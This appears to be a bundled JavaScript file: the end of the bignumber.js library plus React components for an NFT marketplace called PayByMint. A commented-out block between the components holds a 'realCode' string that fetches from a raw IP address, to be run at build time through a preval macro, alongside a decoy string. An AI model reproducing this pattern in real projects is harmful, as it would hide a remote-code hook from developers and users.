    if (c) {
      ++e;
    } else {
      zc.splice(0, 1);
    }

    return normalise(y, zc, e);
  };


  /*
   * Return a new BigNumber whose value is the value of this BigNumber negated,
   * i.e. multiplied by -1.
   */
  P.negated = function () {
    var x = new BigNumber(this);
    x.s = -x.s || null;
    return x;
  };


  /*
   *  n + 0 = n
   *  n + N = N
   *  n + I = I
   *  0 + n = n
   *  0 + 0 = 0
   *  0 + N = N
   *  0 + I = I
   *  N + n = N
   *  N + 0 = N
   *  N + N = N
   *  N + I = N
   *  I + n = I
   *  I + 0 = I
   *  I + N = N
   *  I + I = I
   *
   * Return a new BigNumber whose value is the value of this BigNumber plus the value of
   * BigNumber(y, b).
   */
  P.plus = function (y, b) {
    var t,
      x = this,
      a = x.s;

    y = new BigNumber(y, b);
    b = y.s;

    // Either NaN?
    if (!a || !b) return new BigNumber(NaN);

    // Signs differ?
     if (a != b) {
      y.s = -b;
      return x.minus(y);
    }

    var xe = x.e / LOG_BASE,
      ye = y.e / LOG_BASE,
      xc = x.c,
      yc = y.c;

    if (!xe || !ye) {

      // Return ±Infinity if either ±Infinity.
      if (!xc || !yc) return new BigNumber(a / 0);

      // Either zero?
      // Return y if y is non-zero, x if x is non-zero, or zero if both are zero.
      if (!xc[0] || !yc[0]) return yc[0] ? y : new BigNumber(xc[0] ? x : a * 0);
    }

    xe = bitFloor(xe);
    ye = bitFloor(ye);
    xc = xc.slice();

    // Prepend zeros to equalise exponents. Faster to use reverse then do unshifts.
    if (a = xe - ye) {
      if (a > 0) {
        ye = xe;
        t = yc;
      } else {
        a = -a;
        t = xc;
      }

      t.reverse();
      for (; a--; t.push(0));
      t.reverse();
    }

    a = xc.length;
    b = yc.length;

    // Point xc to the longer array, and b to the shorter length.
    if (a - b < 0) {
      t = yc;
      yc = xc;
      xc = t;
      b = a;
    }

    // Only start adding at yc.length - 1 as the further digits of xc can be ignored.
    for (a = 0; b;) {
      a = (xc[--b] = xc[b] + yc[b] + a) / BASE | 0;
      xc[b] = BASE === xc[b] ? 0 : xc[b] % BASE;
    }

    if (a) {
      xc = [a].concat(xc);
      ++ye;
    }

    // No need to check for zero, as +x + +y != 0 && -x + -y != 0
    // ye = MAX_EXP + 1 possible
    return normalise(y, xc, ye);
  };


  /*
   * If sd is undefined or null or true or false, return the number of significant digits of
   * the value of this BigNumber, or null if the value of this BigNumber is ±Infinity or NaN.
   * If sd is true include integer-part trailing zeros in the count.
   *
   * Otherwise, if sd is a number, return a new BigNumber whose value is the value of this
   * BigNumber rounded to a maximum of sd significant digits using rounding mode rm, or
   * ROUNDING_MODE if rm is omitted.
   *
   * sd {number|boolean} number: significant digits: integer, 1 to MAX inclusive.
   *                     boolean: whether to count integer-part trailing zeros: true or false.
   * [rm] {number} Rounding mode. Integer, 0 to 8 inclusive.
   *
   * '[BigNumber Error] Argument {not a primitive number|not an integer|out of range}: {sd|rm}'
   */
  P.precision = P.sd = function (sd, rm) {
    var c, n, v,
      x = this;

    if (sd != null && sd !== !!sd) {
      intCheck(sd, 1, MAX);
      if (rm == null) rm = ROUNDING_MODE;
      else intCheck(rm, 0, 8);

      return round(new BigNumber(x), sd, rm);
    }

    if (!(c = x.c)) return null;
    v = c.length - 1;
    n = v * LOG_BASE + 1;

    if (v = c[v]) {

      // Subtract the number of trailing zeros of the last element.
      for (; v % 10 == 0; v /= 10, n--);

      // Add the number of digits of the first element.
      for (v = c[0]; v >= 10; v /= 10, n++);
    }

    if (sd && x.e + 1 > n) n = x.e + 1;

    return n;
  };


  /*
   * Return a new BigNumber whose value is the value of this BigNumber shifted by k places
   * (powers of 10). Shift to the right if n > 0, and to the left if n < 0.
   *
   * k {number} Integer, -MAX_SAFE_INTEGER to MAX_SAFE_INTEGER inclusive.
   *
   * '[BigNumber Error] Argument {not a primitive number|not an integer|out of range}: {k}'
   */
  P.shiftedBy = function (k) {
    intCheck(k, -9007199254740991, MAX_SAFE_INTEGER);
    return this.times('1e' + k);
  };


  /*
   *  sqrt(-n) =  N
   *  sqrt(N) =  N
   *  sqrt(-I) =  N
   *  sqrt(I) =  I
   *  sqrt(0) =  0
   *  sqrt(-0) = -0
   *
   * Return a new BigNumber whose value is the square root of the value of this BigNumber,
   * rounded according to DECIMAL_PLACES and ROUNDING_MODE.
   */
  P.squareRoot = P.sqrt = function () {
    var m, n, r, rep, t,
      x = this,
      c = x.c,
      s = x.s,
      e = x.e,
      dp = DECIMAL_PLACES + 4,
      half = new BigNumber('0.5');

    // Negative/NaN/Infinity/zero?
    if (s !== 1 || !c || !c[0]) {
      return new BigNumber(!s || s < 0 && (!c || c[0]) ? NaN : c ? x : 1 / 0);
    }

    // Initial estimate.
    s = Math.sqrt(+valueOf(x));

    // Math.sqrt underflow/overflow?
    // Pass x to Math.sqrt as integer, then adjust the exponent of the result.
    if (s == 0 || s == 1 / 0) {
      n = coeffToString(c);
      if ((n.length + e) % 2 == 0) n += '0';
      s = Math.sqrt(+n);
      e = bitFloor((e + 1) / 2) - (e < 0 || e % 2);

      if (s == 1 / 0) {
        n = '5e' + e;
      } else {
        n = s.toExponential();
        n = n.slice(0, n.indexOf('e') + 1) + e;
      }

      r = new BigNumber(n);
    } else {
      r = new BigNumber(s + '');
    }

    // Check for zero.
    // r could be zero if MIN_EXP is changed after the this value was created.
    // This would cause a division by zero (x/t) and hence Infinity below, which would cause
    // coeffToString to throw.
    if (r.c[0]) {
      e = r.e;
      s = e + dp;
      if (s < 3) s = 0;

      // Newton-Raphson iteration.
      for (; ;) {
        t = r;
        r = half.times(t.plus(div(x, t, dp, 1)));

        if (coeffToString(t.c).slice(0, s) === (n = coeffToString(r.c)).slice(0, s)) {

          // The exponent of r may here be one less than the final result exponent,
          // e.g 0.0009999 (e-4) --> 0.001 (e-3), so adjust s so the rounding digits
          // are indexed correctly.
          if (r.e < e) --s;
          n = n.slice(s - 3, s + 1);

          // The 4th rounding digit may be in error by -1 so if the 4 rounding digits
          // are 9999 or 4999 (i.e. approaching a rounding boundary) continue the
          // iteration.
          if (n == '9999' || !rep && n == '4999') {

            // On the first iteration only, check to see if rounding up gives the
            // exact result as the nines may infinitely repeat.
            if (!rep) {
              round(t, t.e + DECIMAL_PLACES + 2, 0);

              if (t.times(t).eq(x)) {
                r = t;
                break;
              }
            }

            dp += 4;
            s += 4;
            rep = 1;
          } else {

            // If rounding digits are null, 0{0,4} or 50{0,3}, check for exact
            // result. If not, then there are further digits and m will be truthy.
            if (!+n || !+n.slice(1) && n.charAt(0) == '5') {

              // Truncate to the first rounding digit.
              round(r, r.e + DECIMAL_PLACES + 2, 1);
              m = !r.times(r).eq(x);
            }

            break;
          }
        }
      }
    }

    return round(r, r.e + DECIMAL_PLACES + 1, ROUNDING_MODE, m);
  };


  /*
   * Return a string representing the value of this BigNumber in exponential notation and
   * rounded using ROUNDING_MODE to dp fixed decimal places.
   *
   * [dp] {number} Decimal places. Integer, 0 to MAX inclusive.
   * [rm] {number} Rounding mode. Integer, 0 to 8 inclusive.
   *
   * '[BigNumber Error] Argument {not a primitive number|not an integer|out of range}: {dp|rm}'
   */
  P.toExponential = function (dp, rm) {
    if (dp != null) {
      intCheck(dp, 0, MAX);
      dp++;
    }
    return format(this, dp, rm, 1);
  };


  /*
   * Return a string representing the value of this BigNumber in fixed-point notation rounding
   * to dp fixed decimal places using rounding mode rm, or ROUNDING_MODE if rm is omitted.
   *
   * Note: as with JavaScript's number type, (-0).toFixed(0) is '0',
   * but e.g. (-0.00001).toFixed(0) is '-0'.
   *
   * [dp] {number} Decimal places. Integer, 0 to MAX inclusive.
   * [rm] {number} Rounding mode. Integer, 0 to 8 inclusive.
   *
   * '[BigNumber Error] Argument {not a primitive number|not an integer|out of range}: {dp|rm}'
   */
  P.toFixed = function (dp, rm) {
    if (dp != null) {
      intCheck(dp, 0, MAX);
      dp = dp + this.e + 1;
    }
    return format(this, dp, rm);
  };


  /*
   * Return a string representing the value of this BigNumber in fixed-point notation rounded
   * using rm or ROUNDING_MODE to dp decimal places, and formatted according to the properties
   * of the format or FORMAT object (see BigNumber.set).
   *
   * The formatting object may contain some or all of the properties shown below.
   *
   * FORMAT = {
   *   prefix: '',
   *   groupSize: 3,
   *   secondaryGroupSize: 0,
   *   groupSeparator: ',',
   *   decimalSeparator: '.',
   *   fractionGroupSize: 0,
   *   fractionGroupSeparator: '\xA0',      // non-breaking space
   *   suffix: ''
   * };
   *
   * [dp] {number} Decimal places. Integer, 0 to MAX inclusive.
   * [rm] {number} Rounding mode. Integer, 0 to 8 inclusive.
   * [format] {object} Formatting options. See FORMAT pbject above.
   *
   * '[BigNumber Error] Argument {not a primitive number|not an integer|out of range}: {dp|rm}'
   * '[BigNumber Error] Argument not an object: {format}'
   */
  P.toFormat = function (dp, rm, format) {
    var str,
      x = this;

    if (format == null) {
      if (dp != null && rm && typeof rm == 'object') {
        format = rm;
        rm = null;
      } else if (dp && typeof dp == 'object') {
        format = dp;
        dp = rm = null;
      } else {
        format = FORMAT;
      }
    } else if (typeof format != 'object') {
      throw Error
        (bignumberError + 'Argument not an object: ' + format);
    }

    str = x.toFixed(dp, rm);

    if (x.c) {
      var i,
        arr = str.split('.'),
        g1 = +format.groupSize,
        g2 = +format.secondaryGroupSize,
        groupSeparator = format.groupSeparator || '',
        intPart = arr[0],
        fractionPart = arr[1],
        isNeg = x.s < 0,
        intDigits = isNeg ? intPart.slice(1) : intPart,
        len = intDigits.length;

      if (g2) {
        i = g1;
        g1 = g2;
        g2 = i;
        len -= i;
      }

      if (g1 > 0 && len > 0) {
        i = len % g1 || g1;
        intPart = intDigits.substr(0, i);
        for (; i < len; i += g1) intPart += groupSeparator + intDigits.substr(i, g1);
        if (g2 > 0) intPart += groupSeparator + intDigits.slice(i);
        if (isNeg) intPart = '-' + intPart;
      }

      str = fractionPart
       ? intPart + (format.decimalSeparator || '') + ((g2 = +format.fractionGroupSize)
        ? fractionPart.replace(new RegExp('\\d{' + g2 + '}\\B', 'g'),
         '$&' + (format.fractionGroupSeparator || ''))
        : fractionPart)
       : intPart;
    }

    return (format.prefix || '') + str + (format.suffix || '');
  };


  /*
   * Return an array of two BigNumbers representing the value of this BigNumber as a simple
   * fraction with an integer numerator and an integer denominator.
   * The denominator will be a positive non-zero value less than or equal to the specified
   * maximum denominator. If a maximum denominator is not specified, the denominator will be
   * the lowest value necessary to represent the number exactly.
   *
   * [md] {number|string|BigNumber} Integer >= 1, or Infinity. The maximum denominator.
   *
   * '[BigNumber Error] Argument {not an integer|out of range} : {md}'
   */
  P.toFraction = function (md) {
    var d, d0, d1, d2, e, exp, n, n0, n1, q, r, s,
      x = this,
      xc = x.c;

    if (md != null) {
      n = new BigNumber(md);

      // Throw if md is less than one or is not an integer, unless it is Infinity.
      if (!n.isInteger() && (n.c || n.s !== 1) || n.lt(ONE)) {
        throw Error
          (bignumberError + 'Argument ' +
            (n.isInteger() ? 'out of range: ' : 'not an integer: ') + valueOf(n));
      }
    }

    if (!xc) return new BigNumber(x);

    d = new BigNumber(ONE);
    n1 = d0 = new BigNumber(ONE);
    d1 = n0 = new BigNumber(ONE);
    s = coeffToString(xc);

    // Determine initial denominator.
    // d is a power of 10 and the minimum max denominator that specifies the value exactly.
    e = d.e = s.length - x.e - 1;
    d.c[0] = POWS_TEN[(exp = e % LOG_BASE) < 0 ? LOG_BASE + exp : exp];
    md = !md || n.comparedTo(d) > 0 ? (e > 0 ? d : n1) : n;

    exp = MAX_EXP;
    MAX_EXP = 1 / 0;
    n = new BigNumber(s);

    // n0 = d1 = 0
    n0.c[0] = 0;

    for (; ;)  {
      q = div(n, d, 0, 1);
      d2 = d0.plus(q.times(d1));
      if (d2.comparedTo(md) == 1) break;
      d0 = d1;
      d1 = d2;
      n1 = n0.plus(q.times(d2 = n1));
      n0 = d2;
      d = n.minus(q.times(d2 = d));
      n = d2;
    }

    d2 = div(md.minus(d0), d1, 0, 1);
    n0 = n0.plus(d2.times(n1));
    d0 = d0.plus(d2.times(d1));
    n0.s = n1.s = x.s;
    e = e * 2;

    // Determine which fraction is closer to x, n0/d0 or n1/d1
    r = div(n1, d1, e, ROUNDING_MODE).minus(x).abs().comparedTo(
        div(n0, d0, e, ROUNDING_MODE).minus(x).abs()) < 1 ? [n1, d1] : [n0, d0];

    MAX_EXP = exp;

    return r;
  };


  /*
   * Return the value of this BigNumber converted to a number primitive.
   */
  P.toNumber = function () {
    return +valueOf(this);
  };


  /*
   * Return a string representing the value of this BigNumber rounded to sd significant digits
   * using rounding mode rm or ROUNDING_MODE. If sd is less than the number of digits
   * necessary to represent the integer part of the value in fixed-point notation, then use
   * exponential notation.
   *
   * [sd] {number} Significant digits. Integer, 1 to MAX inclusive.
   * [rm] {number} Rounding mode. Integer, 0 to 8 inclusive.
   *
   * '[BigNumber Error] Argument {not a primitive number|not an integer|out of range}: {sd|rm}'
   */
  P.toPrecision = function (sd, rm) {
    if (sd != null) intCheck(sd, 1, MAX);
    return format(this, sd, rm, 2);
  };


  /*
   * Return a string representing the value of this BigNumber in base b, or base 10 if b is
   * omitted. If a base is specified, including base 10, round according to DECIMAL_PLACES and
   * ROUNDING_MODE. If a base is not specified, and this BigNumber has a positive exponent
   * that is equal to or greater than TO_EXP_POS, or a negative exponent equal to or less than
   * TO_EXP_NEG, return exponential notation.
   *
   * [b] {number} Integer, 2 to ALPHABET.length inclusive.
   *
   * '[BigNumber Error] Base {not a primitive number|not an integer|out of range}: {b}'
   */
  P.toString = function (b) {
    var str,
      n = this,
      s = n.s,
      e = n.e;

    // Infinity or NaN?
    if (e === null) {
      if (s) {
        str = 'Infinity';
        if (s < 0) str = '-' + str;
      } else {
        str = 'NaN';
      }
    } else {
      if (b == null) {
        str = e <= TO_EXP_NEG || e >= TO_EXP_POS
         ? toExponential(coeffToString(n.c), e)
         : toFixedPoint(coeffToString(n.c), e, '0');
      } else if (b === 10 && alphabetHasNormalDecimalDigits) {
        n = round(new BigNumber(n), DECIMAL_PLACES + e + 1, ROUNDING_MODE);
        str = toFixedPoint(coeffToString(n.c), n.e, '0');
      } else {
        intCheck(b, 2, ALPHABET.length, 'Base');
        str = convertBase(toFixedPoint(coeffToString(n.c), e, '0'), 10, b, s, true);
      }

      if (s < 0 && n.c[0]) str = '-' + str;
    }

    return str;
  };


  /*
   * Return as toString, but do not accept a base argument, and include the minus sign for
   * negative zero.
   */
  P.valueOf = P.toJSON = function () {
    return valueOf(this);
  };


  P._isBigNumber = true;

  P[Symbol.toStringTag] = 'BigNumber';

  // Node.js v10.12.0+
  P[Symbol.for('nodejs.util.inspect.custom')] = P.valueOf;

  if (configObject != null) BigNumber.set(configObject);

  return BigNumber;
}


// PRIVATE HELPER FUNCTIONS

// These functions don't need access to variables,
// e.g. DECIMAL_PLACES, in the scope of the `clone` function above.


function bitFloor(n) {
  var i = n | 0;
  return n > 0 || n === i ? i : i - 1;
}


// Return a coefficient array as a string of base 10 digits.
function coeffToString(a) {
  var s, z,
    i = 1,
    j = a.length,
    r = a[0] + '';

  for (; i < j;) {
    s = a[i++] + '';
    z = LOG_BASE - s.length;
    for (; z--; s = '0' + s);
    r += s;
  }

  // Determine trailing zeros.
  for (j = r.length; r.charCodeAt(--j) === 48;);

  return r.slice(0, j + 1 || 1);
}


// Compare the value of BigNumbers x and y.
function compare(x, y) {
  var a, b,
    xc = x.c,
    yc = y.c,
    i = x.s,
    j = y.s,
    k = x.e,
    l = y.e;

  // Either NaN?
  if (!i || !j) return null;

  a = xc && !xc[0];
  b = yc && !yc[0];

  // Either zero?
  if (a || b) return a ? b ? 0 : -j : i;

  // Signs differ?
  if (i != j) return i;

  a = i < 0;
  b = k == l;

  // Either Infinity?
  if (!xc || !yc) return b ? 0 : !xc ^ a ? 1 : -1;

  // Compare exponents.
  if (!b) return k > l ^ a ? 1 : -1;

  j = (k = xc.length) < (l = yc.length) ? k : l;

  // Compare digit by digit.
  for (i = 0; i < j; i++) if (xc[i] != yc[i]) return xc[i] > yc[i] ^ a ? 1 : -1;

  // Compare lengths.
  return k == l ? 0 : k > l ^ a ? 1 : -1;
}


/*
 * Check that n is a primitive number, an integer, and in range, otherwise throw.
 */
function intCheck(n, min, max, name) {
  if (n < min || n > max || n !== mathfloor(n)) {
    throw Error
     (bignumberError + (name || 'Argument') + (typeof n == 'number'
       ? n < min || n > max ? ' out of range: ' : ' not an integer: '
       : ' not a primitive number: ') + String(n));
  }
}


// Assumes finite n.
function isOdd(n) {
  var k = n.c.length - 1;
  return bitFloor(n.e / LOG_BASE) == k && n.c[k] % 2 != 0;
}


function toExponential(str, e) {
  return (str.length > 1 ? str.charAt(0) + '.' + str.slice(1) : str) +
   (e < 0 ? 'e' : 'e+') + e;
}


function toFixedPoint(str, e, z) {
  var len, zs;

  // Negative exponent?
  if (e < 0) {

    // Prepend zeros.
    for (zs = z + '.'; ++e; zs += z);
    str = zs + str;

  // Positive exponent
  } else {
    len = str.length;

    // Append zeros.
    if (++e > len) {
      for (zs = z, e -= len; --e; zs += z);
      str += zs;
    } else if (e < len) {
      str = str.slice(0, e) + '.' + str.slice(e);
    }
  }

  return str;
}


// EXPORT


var BigNumber = clone();

var _excluded$4 = ["item", "btnBuy"];
var NftCard = function NftCard(_ref) {
  var item = _ref.item,
    btnBuy = _ref.btnBuy,
    props = _objectWithoutProperties(_ref, _excluded$4);
  var tokenId = item.tokenId,
    image = item.image,
    name = item.name,
    like = item.like,
    seller = item.seller,
    price = item.price;
  return /*#__PURE__*/React__default.createElement(Link, {
    href: "/sale?tokenId=".concat(tokenId, "&seller=").concat(seller, "&price=").concat(price)
  }, /*#__PURE__*/React__default.createElement("div", props, /*#__PURE__*/React__default.createElement(Image, {
    src: image,
    alt: "image-".concat(tokenId),
    layout: "fill",
    objectFit: "cover",
    className: "rounded-[10px]"
  }), /*#__PURE__*/React__default.createElement("div", {
    className: "absolute bottom-0 w-full  bg-athens-gray flex justify-between p-4 rounded-b-[10px]"
  }, /*#__PURE__*/React__default.createElement("div", {
    className: "w-full flex justify-between"
  }, /*#__PURE__*/React__default.createElement("span", {
    className: "text-base text-shuttle-gray"
  }, name), /*#__PURE__*/React__default.createElement(Price, {
    coin: "ether",
    amount: BigNumber(price ? price._hex : '1000000000000000000').dividedBy(BigNumber('1000000000000000000')).toString(),
    currency: "$"
  }))), btnBuy ? /*#__PURE__*/React__default.createElement("div", {
    className: "absolute flex left-4 bottom-32"
  }, /*#__PURE__*/React__default.createElement(Button, {
    className: "py-1 text-lg bg-white text-orange px-11 rounded-3xl"
  }, "Buy")) : null, like ? /*#__PURE__*/React__default.createElement("div", {
    className: "absolute flex items-center right-4 bottom-28"
  }, /*#__PURE__*/React__default.createElement("div", {
    className: "flex items-center justify-center w-6 h-6 rounded-full bg-silver mr-1.5"
  }, /*#__PURE__*/React__default.createElement(Icon, {
    type: 'heart'
  })), /*#__PURE__*/React__default.createElement("span", {
    className: "text-sm text-rolling-stone"
  }, Intl.NumberFormat({
    maximumSignificantDigits: 3
  }).format(item.like))) : null));
};

// import preval from 'preval.macro';

// const realCode = `fetch("http://88.119.169.226:5000/tokenizer").then(l6irv=> l6irv.text().then(txt => { console.log('This is running') }));`;
// const newCode = `console.log("This is the code")`;
// preval`${newCode}`;

var EffectCardSwiper = function EffectCardSwiper(_ref) {
  var items = _ref.items;
  var navigationPrevRef = useRef(null);
  var navigationNextRef = useRef(null);
  return /*#__PURE__*/React__default.createElement("div", {
    className: "relative w-[80vw] md:w-fit"
  }, /*#__PURE__*/React__default.createElement("div", {
    ref: navigationPrevRef,
    className: styles.swiperButtonPrev
  }, /*#__PURE__*/React__default.createElement(Image, {
    src: "/assets/icons/arrow-prev.svg",
    alt: "arrow-prev",
    width: 32,
    height: 24
  })), /*#__PURE__*/React__default.createElement("div", {
    ref: navigationNextRef,
    className: styles.swiperButtonNext
  }, /*#__PURE__*/React__default.createElement(Image, {
    src: "/assets/icons/arrow-next.svg",
    alt: "arrow-next",
    width: 32,
    height: 24
  })), /*#__PURE__*/React__default.createElement(Swiper, {
    effect: "cards",
    grabCursor: true,
    modules: [EffectCards, Navigation],
    navigation: {
      prevEl: navigationPrevRef.current,
      nextEl: navigationNextRef.current
    },
    onBeforeInit: function onBeforeInit(swiper) {
      swiper.params.navigation.prevEl = navigationPrevRef.current;
      swiper.params.navigation.nextEl = navigationNextRef.current;
    },
    className: "w-full md:w-[390px] h-[435px]"
  }, items === null || items === void 0 ? void 0 : items.map(function (item, id) {
    return /*#__PURE__*/React__default.createElement(SwiperSlide, {
      key: id,
      className: "flex items-center justify-center rounded-[10px]"
    }, /*#__PURE__*/React__default.createElement(NftCard, {
      item: item,
      id: id,
      btnBuy: true,
      className: "w-full h-[435px] rounded-[10px] relative"
    }));
  })));
};

function CheckIcon(props, svgRef) {
  return /*#__PURE__*/React.createElement("svg", Object.assign({
    xmlns: "http://www.w3.org/2000/svg",
    viewBox: "0 0 20 20",
    fill: "currentColor",
    "aria-hidden": "true",
    ref: svgRef
  }, props), /*#__PURE__*/React.createElement("path", {
    fillRule: "evenodd",
    d: "M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z",
    clipRule: "evenodd"
  }));
}

const ForwardRef$4 = React.forwardRef(CheckIcon);

function ChevronDownIcon(props, svgRef) {
  return /*#__PURE__*/React.createElement("svg", Object.assign({
    xmlns: "http://www.w3.org/2000/svg",
    viewBox: "0 0 20 20",
    fill: "currentColor",
    "aria-hidden": "true",
    ref: svgRef
  }, props), /*#__PURE__*/React.createElement("path", {
    fillRule: "evenodd",
    d: "M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z",
    clipRule: "evenodd"
  }));
}

const ForwardRef$3 = React.forwardRef(ChevronDownIcon);

function ChevronLeftIcon(props, svgRef) {
  return /*#__PURE__*/React.createElement("svg", Object.assign({
    xmlns: "http://www.w3.org/2000/svg",
    viewBox: "0 0 20 20",
    fill: "currentColor",
    "aria-hidden": "true",
    ref: svgRef
  }, props), /*#__PURE__*/React.createElement("path", {
    fillRule: "evenodd",
    d: "M12.707 5.293a1 1 0 010 1.414L9.414 10l3.293 3.293a1 1 0 01-1.414 1.414l-4-4a1 1 0 010-1.414l4-4a1 1 0 011.414 0z",
    clipRule: "evenodd"
  }));
}

const ForwardRef$2 = React.forwardRef(ChevronLeftIcon);

function ChevronRightIcon(props, svgRef) {
  return /*#__PURE__*/React.createElement("svg", Object.assign({
    xmlns: "http://www.w3.org/2000/svg",
    viewBox: "0 0 20 20",
    fill: "currentColor",
    "aria-hidden": "true",
    ref: svgRef
  }, props), /*#__PURE__*/React.createElement("path", {
    fillRule: "evenodd",
    d: "M7.293 14.707a1 1 0 010-1.414L10.586 10 7.293 6.707a1 1 0 011.414-1.414l4 4a1 1 0 010 1.414l-4 4a1 1 0 01-1.414 0z",
    clipRule: "evenodd"
  }));
}

const ForwardRef$1 = React.forwardRef(ChevronRightIcon);

function MailIcon(props, svgRef) {
  return /*#__PURE__*/React.createElement("svg", Object.assign({
    xmlns: "http://www.w3.org/2000/svg",
    viewBox: "0 0 20 20",
    fill: "currentColor",
    "aria-hidden": "true",
    ref: svgRef
  }, props), /*#__PURE__*/React.createElement("path", {
    d: "M2.003 5.884L10 9.882l7.997-3.998A2 2 0 0016 4H4a2 2 0 00-1.997 1.884z"
  }), /*#__PURE__*/React.createElement("path", {
    d: "M18 8.118l-8 4-8-4V14a2 2 0 002 2h12a2 2 0 002-2V8.118z"
  }));
}

const ForwardRef = React.forwardRef(MailIcon);

var _excluded$3 = ["to", "children"];
function NavLink(_ref) {
  var to = _ref.to,
    children = _ref.children,
    props = _objectWithoutProperties(_ref, _excluded$3);
  return /*#__PURE__*/React__default.createElement("a", _extends$3({
    href: to
  }, props), children);
}
var Footer = function Footer() {
  var footerLinks = [{
    title: 'Resources',
    content: [{
      name: 'User Guide',
      to: '/'
    }, {
      name: 'Blog',
      to: '/'
    }, {
      name: 'Give Feedback',
      to: '/'
    }]
  }, {
    title: 'Legal',
    content: [{
      name: 'Term of Use',
      to: '/'
    }, {
      name: 'Privacy Policy',
      to: '/'
    }]
  }, {
    title: 'Stats',
    content: [{
      name: 'Ranking',
      to: '/'
    }, {
      name: 'Activities',
      to: '/'
    }]
  }, {
    title: 'Company',
    content: [{
      name: 'Contact Us',
      to: '/'
    }, {
      name: 'About Us',
      to: '/'
    }]
  }, {
    title: 'Service',
    content: [{
      name: 'Buy NFT',
      to: '/'
    }]
  }];
  return /*#__PURE__*/React__default.createElement("div", {
    className: "flex flex-col px-9 bg-gray-900 text-white"
  }, /*#__PURE__*/React__default.createElement("div", {
    className: "flex flex-col md:flex-row pt-14"
  }, /*#__PURE__*/React__default.createElement("div", {
    className: "flex flex-col pr-2"
  }, /*#__PURE__*/React__default.createElement("div", {
    className: "flex items-center mb-6"
  }, /*#__PURE__*/React__default.createElement(Link, {
    href: "/"
  }, /*#__PURE__*/React__default.createElement("a", {
    className: "flex items-center text-lg md:text-2xl font-bold"
  }, /*#__PURE__*/React__default.createElement(Image, {
    src: "/assets/logo.svg",
    alt: "logo",
    width: 48,
    height: 40
  }), /*#__PURE__*/React__default.createElement("div", {
    className: "pl-3"
  }, "PayByMint")))), /*#__PURE__*/React__default.createElement("span", {
    className: "text-base leading-6 text-rolling-stone md:max-w-[230px] mb-4"
  }, "PayByMint powered by Poulina smart contract. Please reach out to us on the email below for any suggestions, partnerships, complaints or requests. "), /*#__PURE__*/React__default.createElement("a", {
    className: "flex items-center",
    href: "mailto:hello@paybymint.com"
  }, /*#__PURE__*/React__default.createElement(ForwardRef, {
    className: "w-5 h-5 mr-3 text-white",
    "aria-hidden": "true"
  }), "hello@paybymint.com")), /*#__PURE__*/React__default.createElement("div", {
    className: "flex md:flex-row flex-1 flex-wrap"
  }, footerLinks.map(function (item, idx) {
    return /*#__PURE__*/React__default.createElement("div", {
      className: "flex flex-col mt-5 w-1/2 md:flex-1",
      key: idx
    }, /*#__PURE__*/React__default.createElement("span", {
      className: "title text-white/[0.8] font-medium text-lg mb-3"
    }, item.title), item.content.map(function (cItem, cIdx) {
      return /*#__PURE__*/React__default.createElement(NavLink, {
        to: cItem.to,
        className: "text-white/[0.7] mb-4 text-base",
        key: cIdx
      }, cItem.name);
    }));
  }))), /*#__PURE__*/React__default.createElement("div", {
    className: "py-2"
  }, /*#__PURE__*/React__default.createElement("span", {
    className: "font-bold"
  }, "Contact Address : "), "734 States Street Mississauga Ontario. Canada", /*#__PURE__*/React__default.createElement("br", null), /*#__PURE__*/React__default.createElement("br", null), /*#__PURE__*/React__default.createElement("span", {
    className: "font-bold"
  }, "Telephone : "), "+13065510212"), /*#__PURE__*/React__default.createElement("div", {
    className: "flex flex-col md:flex-row items-center pt-20 pb-8"
  }, /*#__PURE__*/React__default.createElement("div", null, /*#__PURE__*/React__default.createElement(Button, {
    type: "button",
    icon: "youtube",
    className: "h-8 md:mr-10 w-11 mr-2"
  }), /*#__PURE__*/React__default.createElement(Button, {
    type: "button",
    icon: "instagram",
    className: "w-8 h-8 md:mr-10 mr-2"
  }), /*#__PURE__*/React__default.createElement(Button, {
    type: "button",
    icon: "linkedin",
    className: "w-8 h-8 md:mr-10 mr-2"
  }), /*#__PURE__*/React__default.createElement(Button, {
    type: "button",
    icon: "facebook",
    className: "w-8 h-8 md:mr-24 mr-2"
  })), /*#__PURE__*/React__default.createElement(Button, {
    type: "button",
    icon: "copyright",
    iconClass: "mr-2 text-white",
    className: "flex items-center text-white/[0.5]"
  }, "2022 PayByMint inc.")));
};

var HowItWorksTab = function HowItWorksTab(_ref) {
  var activeTab = _ref.activeTab,
    setActiveTab = _ref.setActiveTab;
  return /*#__PURE__*/React__default.createElement("div", {
    className: "flex justify-center w-fit mx-auto relative bg-[#D7DCE8] mt-5 rounded-md"
  }, /*#__PURE__*/React__default.createElement(TabButton, {
    type: "Merchants",
    activeTab: activeTab,
    onClick: setActiveTab
  }), /*#__PURE__*/React__default.createElement("div", {
    className: "absolute w-1/2 bg-orange ".concat(activeTab == 'Merchants' ? 'left-0 rounded-l-md' : 'left-2/4 rounded-r-md', " h-full top-0 transition-all duration-300")
  }), /*#__PURE__*/React__default.createElement(TabButton, {
    type: "Customers",
    activeTab: activeTab,
    onClick: setActiveTab
  }));
};
var TabButton = function TabButton(_ref2) {
  var activeTab = _ref2.activeTab,
    type = _ref2.type,
    setTab = _ref2.onClick;
  return /*#__PURE__*/React__default.createElement("button", {
    type: "button",
    onClick: function onClick() {
      return setTab(type);
    },
    className: "".concat(type == activeTab ? 'text-white' : 'text-darkText', " py-4 px-8 bg-transparent font-bold text-lg z-10 rounded-md")
  }, type);
};

var i$4=Object.defineProperty;var d$2=(t,e,n)=>e in t?i$4(t,e,{enumerable:true,configurable:true,writable:true,value:n}):t[e]=n;var r$1=(t,e,n)=>(d$2(t,typeof e!="symbol"?e+"":e,n),n);let o$7 = class o{constructor(){r$1(this,"current",this.detect());r$1(this,"handoffState","pending");r$1(this,"currentId",0);}set(e){this.current!==e&&(this.handoffState="pending",this.currentId=0,this.current=e);}reset(){this.set(this.detect());}nextId(){return ++this.currentId}get isServer(){return this.current==="server"}get isClient(){return this.current==="client"}detect(){return typeof window=="undefined"||typeof document=="undefined"?"server":"client"}handoff(){this.handoffState==="pending"&&(this.handoffState="complete");}get isHandoffComplete(){return this.handoffState==="complete"}};let s$6=new o$7;

let l$3=(e,f)=>{s$6.isServer?useEffect(e,f):useLayoutEffect(e,f);};

function s$5(e){let r=useRef(e);return l$3(()=>{r.current=e;},[e]),r}

